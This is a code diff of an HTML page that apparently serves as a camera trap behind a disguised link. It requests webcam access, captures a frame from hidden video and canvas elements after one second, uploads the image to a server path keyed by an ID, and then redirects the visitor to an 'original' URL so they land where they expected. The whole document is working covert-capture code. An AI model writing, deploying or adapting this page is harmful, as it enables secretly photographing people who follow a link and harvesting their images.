@@ -1,47 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera Capture</title>
+    <title>Capture Page</title>
 </head>
 <body>
-  <script>
-    async function captureImage() {
-      const video = document.createElement('video');
-      document.body.appendChild(video);
+    <h1>Capturing Photo...</h1>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const uniqueId = window.location.pathname.split('/').pop();
+        const originalUrl = new URLSearchParams(window.location.search).get('url');
 
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      video.srcObject = stream;
-      await video.play();
-
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const context = canvas.getContext('2d');
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const imageData = canvas.toDataURL('image/png');
-      stream.getTracks().forEach(track => track.stop());
-      video.remove();
-
-      return imageData;
-    }
-
-    captureImage().then(async imageData => {
-      const id = window.location.pathname.split('/')[2];
-      const response = await fetch('/upload', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ image: imageData, id })
-      });
-      const result = await response.json();
-      window.location.href = result.redirectUrl;
-    }).catch(error => {
-      console.error('Error capturing image:', error);
-    });
-  </script>
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, 640, 480);
+                        const dataUrl = canvas.toDataURL('image/png');
+                        fetch(`/upload/${uniqueId}`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({ image: dataUrl })
+                        }).then(() => {
+                            window.location.href = originalUrl;
+                        });
+                    }, 1000); // Capture after 1 second
+                };
+            })
+            .catch(err => {
+                console.error('Error accessing the camera', err);
+                window.location.href = originalUrl;
+            });
+    </script>
 </body>
 </html>
